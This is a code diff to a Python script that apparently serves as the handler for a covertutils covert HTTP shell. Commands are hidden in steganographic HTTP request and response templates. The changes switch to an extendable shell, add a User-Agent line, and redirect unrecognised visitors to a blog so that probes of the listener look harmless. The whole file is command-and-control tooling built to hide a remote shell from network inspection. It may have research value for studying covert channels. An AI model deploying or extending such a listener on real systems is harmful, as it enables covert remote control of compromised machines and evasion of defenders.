@@ -12,7 +12,7 @@ from covertutils.handlers import ResponseOnlyHandler
 from covertutils.orchestration import StegoOrchestrator
 from covertutils.datamanipulation import asciiToHexTemplate
 
-from covertutils.shells.impl import StandardShell
+from covertutils.shells.impl import StandardShell, ExtendableShell
 
 from time import sleep
 from os import urandom
@@ -26,7 +26,6 @@ from threading import Thread
 #============================== HTTP Steganography part ===================
 
 resp_ascii = '''HTTP/1.1 404 Not Found
-Date: Sun, 18 Oct 2012 10:36:20 GMT
 Server: Apache/2.2.14 (Win32)
 Content-Length: 363
 Connection: Closed
@@ -47,11 +46,12 @@ Content-Type: text/html; charset=iso-8859-1
 </html>
 '''
 resp_templ = asciiToHexTemplate( resp_ascii )
-
+# qa85b923nm90viuz12.securosophy.com
 req_ascii = '''GET /search.php?q=~~~~~~~~?userid=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ HTTP/1.1
 Host: {0}
 Cookie: SESSIOID=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 eTag: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+User-Agent: covertutils HTTP-shell by John Torakis
 
 '''		# 2 new lines terminate the HTTP Request
 req_templ = asciiToHexTemplate( req_ascii )
@@ -89,14 +89,20 @@ class MyHandler ( ResponseOnlyHandler ) :	#
 		self.onMessage( 'heartbeat', self.request_data )	# If this is a message chunk, treat it as a 'request_data' message
 
 	def onNotRecognised( self ) :
-		# print "[!]< Unrecognised >"			# If someone that isn't the client sent an HTTP Request
-		to_respond = resp_ascii				# create a new response from template (manually)
-		while '~' in to_respond :			# Fill it with random data
-			random_hex_digit = random.choice(string.hexdigits.upper())
-			to_respond = to_respond.replace('~', random_hex_digit, 1)
-		send( to_respond )					# Sent it
-		# This way all random connections will get the same 404 page with random hex in the comments.
-		#	Good luck decrypting that...
+		# print "[!]< Unrecognised >"
+		# If someone that isn't the client sends an HTTP Request
+		redirection_http='''
+HTTP/1.1 302 Found
+Server: Apache/2.2.14 (Win32)
+Location: http://securosophy.com
+Content-Length: 0
+Content-Type: text/plain
+Content-Language: el-US
+Connection: close
+
+		'''	# The response will be a redirection
+		send( redirection_http )					#
+		# This way all random connections will get redirected to "securosophy.com" blog
 #==========================================================================
 
 
@@ -177,8 +183,9 @@ server_thread.start()
 
 
 #============================== Shell Design part ========================
-shell = StandardShell(handler )
-	# ignore_messages = set(['X']) 	# It is also the default argument in BaseShell
+shell = ExtendableShell( handler,
+	ignore_messages = set(['X']) 	# It is also the default argument in BaseShell
+	)
 shell.start()
 
 #==========================================================================
